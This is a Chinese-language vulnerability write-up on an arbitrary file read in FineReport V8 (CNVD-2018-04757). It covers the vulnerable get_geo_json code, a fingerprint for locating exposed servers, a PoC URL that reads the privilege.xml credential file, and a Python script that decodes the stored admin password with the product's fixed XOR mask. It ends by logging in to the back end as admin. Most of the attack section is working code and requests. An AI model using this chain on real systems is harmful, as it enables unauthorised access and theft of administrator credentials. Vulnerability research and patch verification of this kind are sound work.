# 帆软报表 V8 get_geo_json 任意文件读取漏洞 CNVD-2018-04757

## 漏洞描述

FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。

FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。

## 漏洞影响

<a-checkbox checked>FineReport < v8.0</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="isSupportForgetPwd"</a-checkbox></br>

## 漏洞复现

出现漏洞的文件为 fr-applet-8.0.jar

```java
package com.fr.chart.web;

import com.fr.base.FRContext;
import com.fr.general.IOUtils;
import com.fr.stable.CodeUtils;
import com.fr.web.core.ActionNoSessionCMD;
import com.fr.web.utils.WebUtils;
import java.io.InputStream;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class ChartGetFileContentAction extends ActionNoSessionCMD {
    public ChartGetFileContentAction() {
    }

    public void actionCMD(HttpServletRequest var1, HttpServletResponse var2, String var3) throws Exception {
        String var4 = CodeUtils.cjkDecode(WebUtils.getHTTPRequestParameter(var1, "resourcepath"));
        if (!WebUtils.invalidResourcePath(var4)) {
            InputStream var5 = FRContext.getCurrentEnv().readResource(var4);
            String var6 = IOUtils.inputStream2String(var5);
            var6 = var6.replace('\ufeff', ' ');
            WebUtils.printAsString(var2, var6);
        }
    }

    public String getCMD() {
        return "get_geo_json";
    }
}
```



使用request将文件名传入 调用cjkDecode函数解密文件名

使用invalidResourcePath函数校验文件是否存在

最后使用readResource函数读取文件传输到浏览器上 默认目录为resources

其中的privilege.xml里面存储了后台的用户名密码

```xml
<?xml version="1.0" encoding="UTF-8"?>
<PrivilegeManager xmlVersion="20170715" releaseVersion="8.0.0" fsSystemManagerPassSet="true" birthday="0" male="false">
<rootManagerName>
<![CDATA[admin]]></rootManagerName>
<rootManagerPassword>
<![CDATA[___00520017004e002b004100b7004200250023007f003d003d005400e4001c0057]]></rootManagerPassword>
<AP class="com.fr.privilege.providers.NoAuthenticationProvider"/>
<ForwardUrl>
<![CDATA[${servletURL}?op=fr_platform]]></ForwardUrl>
<PVFILTER class="com.fr.fs.privilege.auth.BasePrivilegeFilter"/>
</PrivilegeManager>
```

<a-checkbox checked>加密函数</a-checkbox></br>

```java
public static String passwordEncode(String var0) {
        StringBuilder var1 = new StringBuilder();
        var1.append("___");
        if (var0 == null) {
            return var1.toString();
        } else {
            int var2 = 0;

            for(int var3 = 0; var3 < var0.length(); ++var3) {
                if (var2 == PASSWORD_MASK_ARRAY.length) {
                    var2 = 0;
                }

                int var4 = var0.charAt(var3) ^ PASSWORD_MASK_ARRAY[var2];
                String var5 = Integer.toHexString(var4);
                int var6 = var5.length();

                for(int var7 = 0; var7 < 4 - var6; ++var7) {
                    var5 = "0" + var5;
                }

                var1.append(var5);
                ++var2;
            }

            return var1.toString();
        }
    }
```

<a-checkbox checked>解密函数</a-checkbox></br>

```java
public static String passwordDecode(String var0) {
        if (var0 != null && var0.startsWith("___")) {
            var0 = var0.substring(3);
            StringBuilder var1 = new StringBuilder();
            int var2 = 0;

            for(int var3 = 0; var3 <= var0.length() - 4; var3 += 4) {
                if (var2 == PASSWORD_MASK_ARRAY.length) {
                    var2 = 0;
                }

                String var4 = var0.substring(var3, var3 + 4);
                int var5 = Integer.parseInt(var4, 16) ^ PASSWORD_MASK_ARRAY[var2];
                var1.append((char)var5);
                ++var2;
            }

            var0 = var1.toString();
        }

        return var0;
    }
```



使用python写出的解密代码为

```python
cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文
PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码
Password = ""
cipher = cipher[3:] #截断三位后
for i in range(int(len(cipher) / 4)):
    c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
    c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
    Password = Password + chr(c2)
print (Password)
```



这里使用上面讲述的原理进行复现,访问目标



![img](../../../.vuepress/public/img/fan-1.png)

访问POC为,读取密码文件 privilege.xml

```plain
/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

![img](../../../.vuepress/public/img/fan-2.png)



使用解密脚本解密文件



![img](../../../.vuepress/public/img/fan-3.png)



得到密码，即可登陆后台系统，账户为 admin



![img](../../../.vuepress/public/img/fan-4.png)